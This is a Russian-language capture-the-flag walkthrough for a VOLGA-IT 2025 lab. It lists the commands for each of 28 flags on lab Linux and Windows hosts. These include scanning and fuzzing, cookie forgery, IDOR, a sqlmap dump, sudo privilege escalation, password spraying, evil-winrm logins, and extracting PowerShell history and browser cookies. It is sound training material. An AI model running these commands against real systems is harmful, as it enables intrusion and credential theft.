# VOLGA-IT 2025 — команды и места флагов

**Диапазон:** `10.73.73.1–10.73.73.100` · **Linux:** `10.73.73.13` · **Windows:** `10.73.73.37`  
**Формат:** `vit25{...}` · `wordlist` — путь к словарю; `<...>` — значение из задания.

## 0. Разведка

```bash
nmap -sP 10.73.73.1-100
nmap -sC -sV -v -p- -oN NmapAllPort13 10.73.73.13
nmap -sC -sV -v -p- -oN nmap_all_port_37 10.73.73.37
```

## 1. Linux · Web — `frieren.local` (10 флагов)

01. **`/etc/hosts`** — `cat /etc/hosts` → `echo "10.73.73.13 frieren.local test.frieren.local" | sudo tee -a /etc/hosts`
02. **HTML главной** — `curl -s http://frieren.local/`
03. **`/robots.txt`** — `curl -s http://frieren.local/robots.txt` · также `/check_admin.php`, `/underground_dir/`
04. **`/underground_dir/`** — `curl -s -H 'Cookie: is_admin=True' http://frieren.local/underground_dir/`
05. **`test.frieren.local`** — `ffuf -w wordlist -ic -c -u http://frieren.local/ -H 'Host: FUZZ.frieren.local'`
06. **`test.frieren.local/topsecret.bak`** — `ffuf -w wordlist -ic -c -u http://test.frieren.local/FUZZ -e .bak,.txt,.docs,.pdf`
07. **EXIF картинки на `test.frieren.local`** — `exiftool image_name.jpg`
08. **JS-файл главной (`<script src=...>`)** — `curl -s http://frieren.local/ | grep -i '\.js'` · внутри также логин/пароль
09. **Личный кабинет → сообщение № 74** — IDOR, изменить ID сообщения на `74`
10. **Параметр `msg`** — SQLi; `sqlmap -r request.txt -p msg --batch --dump` · также SSH-учётные данные `himmel`

## 2. Linux · Shell — `himmel → localadmin → root` (9 флагов)

```bash
ssh himmel@10.73.73.13
```

11. **`/home/himmel/.flag`** — `cat ~/.flag`
12. **`/etc/passwd`** — `cat /etc/passwd`
13. **`/etc/group`** — `cat /etc/group`
14. **Вывод `uname`** — `uname -a`
15. **Переменные окружения** — `printenv`
16. **Ежеминутный скрипт / процессы** — `./pspy64` · также пароль `localadmin`

```bash
su - localadmin
```

17. **`/home/localadmin/hacker_in_the_club.pcap`** — `tshark -r hacker_in_the_club.pcap -Y 'icmp.type == 8' -T fields -e data.data | tr -d '\n' | xxd -r -p`
18. **`/home/localadmin/.bash_history`** — `cat ~/.bash_history`
19. **`/root/sec_flag`** — `sudo -l` → `sudo /usr/local/bin/welcome.sh` → `Ctrl+C` → `cat /root/sec_flag`

## 3. Windows · SMB / API (2 флага)

20. **`\\10.73.73.37\garbage\notes.txt`** — `nxc smb 10.73.73.37 -u 'a' -p '' --shares` → `smbclient -N //10.73.73.37/garbage`
21. **`client.exe` → JSON API `:5000`** — `strings client.exe` → `python3 ./pyinstxtractor/pyinstxtractor.py client.exe` → `./pycdc client.pyc > decClient.py`

```bash
# В smbclient:
ls
get notes.txt
get client.exe
```

`cat notes.txt`

## 4. Windows · Developer (3 флага)

```bash
ssh Developer@10.73.73.37
```

22. **`C:\Users\Developer\Documents\info.txt` (скрытый)** — `cd C:\Users\Developer\Documents && dir /ah && type info.txt`
23. **Описание пользователя `Manager`** — `net user Manager`
24. **Сетевой интерфейс** — `ipconfig`

## 5. Windows · Manager (2 флага)

```bash
nxc smb 10.73.73.37 -u 'Manager' -p /usr/share/wordlists/rockyou.txt
evil-winrm -i 10.73.73.37 -u Manager -p '<пароль>'
```

25. **`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`** — `Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`
26. **Firefox → cookies** — `.\hack-browser-data.exe -b all -f json --dir results --zip` · ярлык `FireFox.lnk` на рабочем столе

## 6. Windows · ServiceUser / Administrator (2 флага)

```bash
nxc smb 10.73.73.37 -u users.txt -p '<найденный_пароль>' --continue-on-success
evil-winrm -i 10.73.73.37 -u ServiceUser -p '<пароль>'
```

27. **`C:\$Recycle.Bin\<SID>\flag.txt`** — `Get-LocalUser -Name 'ServiceUser' | Select-Object Name,SID` → `Get-Content 'C:\$Recycle.Bin\<SID>\flag.txt'` · рядом учётные данные `Administrator`
28. **`C:\Users\Administrator\Desktop\root.txt`** — `ssh Administrator@10.73.73.37` → `type C:\Users\Administrator\Desktop\root.txt` → шифр Цезаря

---

*Точные адреса страниц личного кабинета, параметры JSON API, пароли и значения флагов в исходном врайтапе не раскрыты. Команды `sqlmap` и `tshark` добавлены как способы повторить описанные проверки.*
